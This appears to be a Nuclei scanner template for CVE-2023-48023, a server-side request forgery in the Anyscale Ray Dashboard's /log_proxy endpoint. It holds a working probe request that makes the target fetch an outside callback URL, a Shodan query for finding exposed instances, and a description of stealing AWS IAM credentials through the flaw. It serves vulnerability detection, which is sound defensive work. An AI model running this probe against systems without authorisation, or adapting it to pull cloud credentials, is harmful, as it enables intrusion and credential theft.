http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: body
    type: word
    words:
    - <h1> Interactsh Server </h1>
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/log_proxy?url=http://{{interactsh-url}}'
id: CVE-2023-48023
info:
  author: cookiehanhoan,harryha
  classification:
    cve-id: CVE-2023-48023
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-441,CWE-918
  description: 'The Ray Dashboard API is affected by a Server-Side Request Forgery
    (SSRF) vulnerability in the url parameter of the /log_proxy API endpoint. The
    API does not perform sufficient input validation within the affected parameter
    and any HTTP or HTTPS URLs are accepted as valid.

    '
  impact: 'The issue is exploitable without authentication and is dependent only on
    network connectivity to the Ray Dashboard port (8265 by default). The vulnerability
    could be exploited to retrieve the highly privileged IAM credentials required
    by Ray from the AWS metadata API. As an impact it is known to affect confidentiality,
    integrity, and availability.

    '
  metadata:
    max-request: 1
    shodan-query: http.favicon.hash:463802404
    vendor: Anyscale
    verified: true
  name: Anyscale Ray 2.6.3 and 2.8.0 - Server-Side Request Forgery
  reference:
  - https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0
  - https://huntr.com/bounties/448bcada-9f6f-442e-8950-79f41efacfed/
  - https://security.snyk.io/vuln/SNYK-PYTHON-RAY-6096054
  - https://nvd.nist.gov/vuln/detail/CVE-2023-48023
  remediation: Update to the latest version
  severity: high
  tags: cve,cve2023,ssrf,ray,anyscale
